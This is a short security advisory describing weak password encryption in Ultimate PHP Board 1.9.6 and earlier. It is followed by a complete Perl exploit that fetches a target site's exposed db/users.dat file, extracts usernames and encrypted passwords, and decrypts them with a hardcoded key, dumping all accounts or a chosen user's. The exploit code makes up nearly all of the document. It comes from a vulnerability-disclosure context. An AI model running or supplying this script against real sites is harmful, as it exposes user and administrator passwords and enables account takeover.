source: http://www.securityfocus.com/bid/13975/info

Ultimate PHP Board is prone to a weak password encryption vulnerability. This issue is due to a failure of the application to protect passwords with a sufficiently effective encryption scheme.

This issue may allow a malicious user to gain access to user and administrator passwords for the affected application.

#!/usr/bin/perl
#
# Passwords Decrypter for UPB <= 1.9.6
# Related advisory:
http://www.securityfocus.com/archive/1/402461/30/0/threaded
# Discovered and Coded by Alberto Trivero

use Getopt::Std;
use LWP::Simple;
getopt('hfu');

print "\n\t========================================\n";
print "\t= Passwords Decrypter for UPB <= 1.9.6 =\n";
print "\t=          by Alberto Trivero          =\n";
print "\t========================================\n\n";

if(!$opt_h or !($opt_f or $opt_u) or ($opt_f && $opt_u)) {
   print "Usage:\nperl $0 -h [full_target_path] [-f [output_file_name] OR -u
[username]]\n\n";
   print "Examples:\nperl $0 -h http://www.example.com/upb/ -f
results.txt\n";
   print "perl $0 -h http://www.example.com/upb/ -u Alby\n";
   exit(0);
}

$key="wdnyyjinffnruxezrkowkjmtqhvrxvolqqxokuofoqtneltaomowpkfvmmogbayankrnrh
mbduzfmpctxiidweripxwglmwrmdscoqyijpkzqqzsuqapfkoshhrtfsssmcfzuffzsfxdwupkzv
qnloubrvwzmsxjuoluhatqqyfbyfqonvaosminsxpjqebcuiqggccl";
$page=get($opt_h."db/users.dat") || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $opt_h\n";
@page=split(/\n/,$page);

if($opt_f) {
   open(RESULTS,"+>$opt_f") || die "[-] Unable to open $opt_f: $!";
   print RESULTS "Results for $opt_h\n","="x40,"\n\n";
   for($in=0;$in<@page;$in++) {
      $page[$in]=~m/^(.*?)<~>/ && print RESULTS "Username: $1\n";
      $page[$in]=~m/^$1<~>(.*?)<~>/ && print RESULTS "Crypted Password:
$1\n";
      &decrypt;
      print RESULTS "Decrypted Password: $crypt\n\n";
      $crypt="";
   }
   close(RESULTS);
   print "[+] Results printed correct in: $opt_f\n";
}

if($opt_u) {
   for($in=0;$in<@page;$in++) {
      if($page[$in]=~m/^$opt_u<~>(.*?)<~>/) {
        print "[+] Username: $opt_u\n";
        print "[+] Crypted Password: $1\n";
         &decrypt;
         print "[+] Decrypted Password: $crypt\n";
         exit(0);
      }
   }
   print "[-] Username '$opt_u' doesn't exist\n";
}

sub decrypt {
   for($i=0;$i<length($1);$i++) {
      $i_key=ord(substr($key, $i, 1));
      $i_text=ord(substr($1, $i, 1));
      $n_key=ord(substr($key, $i+1, 1));
      $i_crypt=$i_text + $n_key;
      $i_crypt-=$i_key;
      $crypt.=chr($i_crypt);
   }
}